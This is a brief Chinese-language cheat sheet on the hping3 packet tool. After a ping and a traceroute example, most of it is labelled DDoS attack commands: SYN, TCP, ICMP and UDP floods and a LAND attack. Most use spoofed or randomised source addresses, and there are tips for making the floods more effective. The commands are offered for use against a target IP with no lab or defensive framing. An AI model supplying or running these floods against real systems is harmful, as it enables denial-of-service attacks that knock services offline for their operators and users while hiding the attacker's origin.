# Hping3工具的使用

- **ICMP测试**
  - `hping3 -1 xxx`   等同于Ping命令

- **数据包追踪**
  - `hping3 --traceroute -V -1 xxx`
- **DDOS攻击**
  - SYN Flood攻击
    - `hping3 -c 连接数 -d 数据包大小 -S -p 目标端口 --flood --rand-source 目标ip//其中--rand-source表示随机发信源地址`，添加-P：PUSH  -U：置为紧急可以提高效率
  - TCP Flood攻击
    - `hping3 -SARUPF -p 目标端口 --flood --rand-source 目标ip`
  - ICMP Flood攻击
    - `hping3 -q -n -d 数据包大小 --icmp-flood -a 指定发信源地址 目标ip//-q安静模式 -n不解析域名`
  - UDP Flood攻击
    - `hping3 --udp -s 6666 -p 目标udp端口 --flood 目标ip//-s指定要发送的udp信息`
  - LAND攻击
    - `hping3 -n -S -p目标端口 -a 指定发信源地址 --flood 目标ip`